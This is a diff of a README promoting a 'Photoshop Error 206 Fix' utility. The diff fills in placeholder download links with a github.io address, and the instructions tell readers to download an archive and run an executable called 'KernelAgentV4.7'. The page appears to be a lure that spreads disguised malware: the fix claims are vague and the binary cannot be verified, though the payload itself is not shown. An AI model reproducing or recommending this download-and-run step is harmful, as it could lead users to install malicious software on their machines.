@@ -2,13 +2,15 @@
 
 Photoshop’s “Error 206” occurs when Creative Cloud fails to download essential files during installation or update. This tool repairs download paths, resets Adobe cache, and restores payload integrity using `KernelAgentV4.7`.
 
-[![Download Error 206 Fix](https://img.shields.io/badge/Download-Photoshop_Error_206_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Error 206 Fix](https://img.shields.io/badge/Download-Photoshop_Error_206_Fix-blueviolet)](https://photoshop-error-206-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-error-206-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopError206Fix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The utility will clean corrupted install cache, restore missing Adobe download folders, and reset temporary paths  
